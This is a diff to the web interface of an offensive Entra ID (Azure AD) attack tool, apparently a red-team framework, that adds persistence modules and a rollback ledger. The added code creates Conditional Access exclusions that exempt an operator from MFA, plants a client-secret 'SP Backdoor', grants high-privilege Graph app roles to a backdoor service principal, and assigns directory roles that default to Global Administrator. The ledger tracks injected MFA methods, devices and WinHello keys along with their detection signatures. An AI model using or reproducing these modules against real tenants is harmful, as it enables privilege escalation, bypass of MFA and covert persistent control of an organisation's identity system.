@@ -131,6 +131,10 @@
       <div class="sidebar-label">Graph Actions</div>
       <button class="btn" onclick="showSection('graph-actions')">⚙ Graph Actions</button>
     </div>
+    <div class="sidebar-section">
+      <div class="sidebar-label">Engagement</div>
+      <button class="btn" onclick="showSection('ledger');loadArtifacts()">🧹 Deployment Ledger</button>
+    </div>
   </div>
 
   
@@ -553,6 +557,75 @@
           </div>
         </div>
 
+
+        <div style="border:1px solid var(--border);border-radius:0;margin-top:16px">
+          <div style="padding:8px 14px;background:var(--bg3);border-bottom:1px solid var(--border);font-size:10px;letter-spacing:0.2em;text-transform:uppercase;color:var(--accent)">CA Exclusion Policy <span style="color:var(--warn);letter-spacing:0">· persistence · logged</span></div>
+          <div style="padding:14px">
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
+              <div class="input-group"><label>POLICY DISPLAY NAME</label><input id="gaCaName" type="text" placeholder="Baseline MFA Policy"></div>
+              <div class="input-group"><label>EXCLUDE USER OID (operator)</label><input id="gaCaExclude" type="text" placeholder="00000000-0000-0000-0000-000000000000"></div>
+            </div>
+            <div class="input-group"><label>STATE</label>
+              <select id="gaCaState">
+                <option value="enabledForReportingButNotEnforced">report-only (safe default)</option>
+                <option value="enabled">enabled (enforce)</option>
+                <option value="disabled">disabled</option>
+              </select>
+            </div>
+            <button class="btn btn-primary" onclick="gaCreateCAExclusion()">▶ Create CA Exclusion</button>
+            <pre id="gaCaOut" style="margin-top:10px;background:var(--bg);border:1px solid var(--border);border-radius:0;padding:10px;font-size:11px;max-height:200px;overflow-y:auto;display:none"></pre>
+          </div>
+        </div>
+
+        <div style="border:1px solid var(--border);border-radius:0;margin-top:16px">
+          <div style="padding:8px 14px;background:var(--bg3);border-bottom:1px solid var(--border);font-size:10px;letter-spacing:0.2em;text-transform:uppercase;color:var(--accent)">SP Backdoor — Add Client Secret <span style="color:var(--warn);letter-spacing:0">· persistence · logged</span></div>
+          <div style="padding:14px">
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
+              <div class="input-group"><label>APP OBJECT ID</label><input id="gaSecAppId" type="text" placeholder="application object id (not appId)"></div>
+              <div class="input-group"><label>SECRET LABEL</label><input id="gaSecLabel" type="text" placeholder="client-secret"></div>
+            </div>
+            <button class="btn btn-primary" onclick="gaAddAppPassword()">▶ Add Client Secret</button>
+            <pre id="gaSecOut" style="margin-top:10px;background:var(--bg);border:1px solid var(--border);border-radius:0;padding:10px;font-size:11px;max-height:200px;overflow-y:auto;display:none"></pre>
+          </div>
+        </div>
+
+        <div style="border:1px solid var(--border);border-radius:0;margin-top:16px">
+          <div style="padding:8px 14px;background:var(--bg3);border-bottom:1px solid var(--border);font-size:10px;letter-spacing:0.2em;text-transform:uppercase;color:var(--accent)">Assign App Role (application permission) <span style="color:var(--warn);letter-spacing:0">· persistence · logged</span></div>
+          <div style="padding:14px">
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
+              <div class="input-group"><label>RESOURCE SP ID (e.g. Graph)</label><input id="gaRoleResourceSp" type="text" placeholder="use Find Graph SP →"></div>
+              <div class="input-group"><label>PRINCIPAL SP ID (backdoor)</label><input id="gaRolePrincipal" type="text" placeholder="your SP object id"></div>
+            </div>
+            <div class="input-group"><label>APP ROLE ID</label><input id="gaRoleAppRole" type="text" placeholder="e.g. RoleManagement.ReadWrite.Directory id"></div>
+            <button class="btn btn-sm" onclick="gaFindGraphSP()" style="margin-right:6px">🔍 Find Graph SP</button>
+            <button class="btn btn-primary" onclick="gaAssignAppRole()">▶ Assign App Role</button>
+            <pre id="gaRoleOut" style="margin-top:10px;background:var(--bg);border:1px solid var(--border);border-radius:0;padding:10px;font-size:11px;max-height:200px;overflow-y:auto;display:none"></pre>
+          </div>
+        </div>
+
+        <div style="border:1px solid var(--border);border-radius:0;margin-top:16px">
+          <div style="padding:8px 14px;background:var(--bg3);border-bottom:1px solid var(--border);font-size:10px;letter-spacing:0.2em;text-transform:uppercase;color:var(--accent)">Assign Directory Role (e.g. Global Admin) <span style="color:var(--warn);letter-spacing:0">· persistence · logged</span></div>
+          <div style="padding:14px">
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
+              <div class="input-group"><label>PRINCIPAL ID (user / SP)</label><input id="gaDirPrincipal" type="text" placeholder="object id of principal"></div>
+              <div class="input-group"><label>ROLE DEFINITION ID</label><input id="gaDirRole" type="text" value="62e90394-69f5-4237-9190-012177145e10"></div>
+            </div>
+            <div class="input-group"><label>DIRECTORY SCOPE</label><input id="gaDirScope" type="text" value="/"></div>
+            <button class="btn btn-primary" onclick="gaAssignDirectoryRole()">▶ Assign Directory Role</button>
+            <pre id="gaDirOut" style="margin-top:10px;background:var(--bg);border:1px solid var(--border);border-radius:0;padding:10px;font-size:11px;max-height:200px;overflow-y:auto;display:none"></pre>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+
+    <div id="sec-ledger" class="section-body">
+      <div class="panel">
+        <div class="panel-title">🧹 Deployment Ledger / Teardown</div>
+        <p style="font-size:11px;color:var(--text-dim);margin-bottom:14px">Every mutation ENTRAITH pushes into a target tenant — app registration, cloned group, injected MFA method, registered device, WinHello key — is logged here with its rollback descriptor and the audit signature it triggers. <span style="color:var(--accent3)">Graph-kind</span> artifacts roll back with one click; <span style="color:var(--warn)">device / WinHello / MFA</span> are DRS- or session-bound and are surfaced for manual cleanup. Guaranteed cleanup + exportable evidence trail.</p>
+        <button class="btn btn-sm btn-primary" onclick="loadArtifacts()" style="margin-bottom:12px">↻ Refresh</button>
+        <div id="ledgerList"><div style="color:var(--text-dim);font-size:11px">Click Refresh.</div></div>
       </div>
     </div>
 
@@ -821,6 +894,65 @@ async function gaDeployApp() {
   out.textContent = JSON.stringify(data, null, 2);
 }
 
+// ─── Persistence modules (recorded in the Deployment Ledger) ──────────────────
+function _gaIds() {
+  const cid = document.getElementById('gaCampaignId').value;
+  const tid = parseTid(document.getElementById('gaTargetId').value);
+  if (!cid || !tid) { alert('Select campaign and target first'); return null; }
+  return {cid, tid};
+}
+
+async function gaCreateCAExclusion() {
+  const ids = _gaIds(); if (!ids) return;
+  const name = document.getElementById('gaCaName').value.trim();
+  const excl = document.getElementById('gaCaExclude').value.trim();
+  const state = document.getElementById('gaCaState').value;
+  if (!name || !excl) { alert('Policy name and exclude user OID required'); return; }
+  const out = document.getElementById('gaCaOut'); out.style.display='block'; out.textContent='Creating...';
+  const data = await api('POST', `/campaigns/${ids.cid}/graph/${ids.tid}/ca-exclusion`, {display_name:name, exclude_user_id:excl, state});
+  out.textContent = JSON.stringify(data, null, 2);
+}
+
+async function gaAddAppPassword() {
+  const ids = _gaIds(); if (!ids) return;
+  const appId = document.getElementById('gaSecAppId').value.trim();
+  const label = document.getElementById('gaSecLabel').value.trim();
+  if (!appId) { alert('App object ID required'); return; }
+  const out = document.getElementById('gaSecOut'); out.style.display='block'; out.textContent='Adding secret...';
+  const data = await api('POST', `/campaigns/${ids.cid}/graph/${ids.tid}/add-app-password`, {app_object_id:appId, display_name:label});
+  out.textContent = JSON.stringify(data, null, 2);
+}
+
+async function gaFindGraphSP() {
+  const ids = _gaIds(); if (!ids) return;
+  const out = document.getElementById('gaRoleOut'); out.style.display='block'; out.textContent='Looking up Graph SP...';
+  const data = await api('GET', `/campaigns/${ids.cid}/graph/${ids.tid}/find-sp`);
+  out.textContent = JSON.stringify(data, null, 2);
+  try { const sp = data.value && data.value[0]; if (sp && sp.id) document.getElementById('gaRoleResourceSp').value = sp.id; } catch(e){}
+}
+
+async function gaAssignAppRole() {
+  const ids = _gaIds(); if (!ids) return;
+  const res  = document.getElementById('gaRoleResourceSp').value.trim();
+  const prin = document.getElementById('gaRolePrincipal').value.trim();
+  const role = document.getElementById('gaRoleAppRole').value.trim();
+  if (!res || !prin || !role) { alert('Resource SP, principal SP and app role ID required'); return; }
+  const out = document.getElementById('gaRoleOut'); out.style.display='block'; out.textContent='Assigning...';
+  const data = await api('POST', `/campaigns/${ids.cid}/graph/${ids.tid}/assign-app-role`, {resource_sp_id:res, principal_id:prin, app_role_id:role});
+  out.textContent = JSON.stringify(data, null, 2);
+}
+
+async function gaAssignDirectoryRole() {
+  const ids = _gaIds(); if (!ids) return;
+  const prin  = document.getElementById('gaDirPrincipal').value.trim();
+  const role  = document.getElementById('gaDirRole').value.trim();
+  const scope = document.getElementById('gaDirScope').value.trim() || '/';
+  if (!prin || !role) { alert('Principal ID and role definition ID required'); return; }
+  const out = document.getElementById('gaDirOut'); out.style.display='block'; out.textContent='Assigning...';
+  const data = await api('POST', `/campaigns/${ids.cid}/graph/${ids.tid}/assign-directory-role`, {principal_id:prin, role_definition_id:role, directory_scope_id:scope});
+  out.textContent = JSON.stringify(data, null, 2);
+}
+
 async function loadDeviceCertsForSelects() {
   const data = await api('GET', '/device-certs');
   const certs = Array.isArray(data) ? data : [];
@@ -1081,6 +1213,45 @@ async function loadWinHelloKeys() {
 async function deleteWinHelloKey(id) {
   await apiFetch('/winhello-keys/'+id, {method:'DELETE'});
   loadWinHelloKeys();
+}
+
+// ─── Deployment ledger / teardown ───────────────────────────────────────────
+async function loadArtifacts() {
+  const el = document.getElementById('ledgerList');
+  el.innerHTML = '⏳ Loading...';
+  const data = await api('GET', '/artifacts');
+  if (data && data.error) { el.innerHTML = '<div style="color:var(--accent2);font-size:11px">'+escH(data.error)+'</div>'; return; }
+  const arts = Array.isArray(data) ? data : [];
+  if (!arts.length) { el.innerHTML = '<div style="color:var(--text-dim);font-size:11px">No deployed artifacts recorded yet. Mutating operations (deploy app, clone group, inject MFA, register device / WinHello) are logged here automatically.</div>'; return; }
+  el.innerHTML = arts.map(a => {
+    const done = a.status === 'rolled_back';
+    const auto = a.rollback_kind === 'graph';
+    const sColor = done ? 'var(--accent3)' : (a.status === 'failed' ? 'var(--accent2)' : 'var(--text-bright)');
+    let action;
+    if (done)      action = '<span style="font-size:10px;color:var(--accent3)">✓ rolled back</span>';
+    else if (auto) action = '<button class="btn btn-sm btn-danger" onclick="rollbackArtifact(\''+escH(a.id)+'\')">↺ Roll back</button>';
+    else           action = '<span style="font-size:10px;color:var(--warn)" title="'+escH((a.rollback_method||'')+' '+(a.rollback_url||''))+'">manual ⓘ</span>';
+    const manualHint = auto ? '' : '<div class="card-sub" style="color:var(--text-dim)">↺ '+escH((a.rollback_method||'')+' '+(a.rollback_url||''))+'</div>';
+    return '<div class="card">'
+      + '<div class="card-info">'
+      +   '<div class="card-label">'+escH(a.display_name||a.type)+' <span style="font-size:9px;color:var(--accent);border:1px solid var(--border);padding:1px 5px;margin-left:4px">'+escH(a.type)+'</span></div>'
+      +   '<div class="card-sub">obj: '+escH(a.object_id||'—')+' · rollback: '+escH(a.rollback_kind)+' · detect: '+escH(a.detection_signature||'—')+'</div>'
+      +   manualHint
+      + '</div>'
+      + '<div class="card-actions" style="display:flex;align-items:center;gap:10px">'
+      +   '<span style="font-size:10px;color:'+sColor+'">'+escH(a.status)+'</span>'
+      +   action
+      + '</div>'
+      + '</div>';
+  }).join('');
+}
+
+async function rollbackArtifact(id) {
+  if (!confirm('Roll back this artifact? This deletes the object from the target tenant.')) return;
+  const res = await api('POST', '/artifacts/'+id+'/rollback');
+  if (res && res.error) alert(res.error);
+  else if (res && res.status === 'failed') alert('Rollback failed: '+(res.detail||'unknown error'));
+  loadArtifacts();
 }
 
 // ─── MFA ──────────────────────────────────────────────────────────────────────
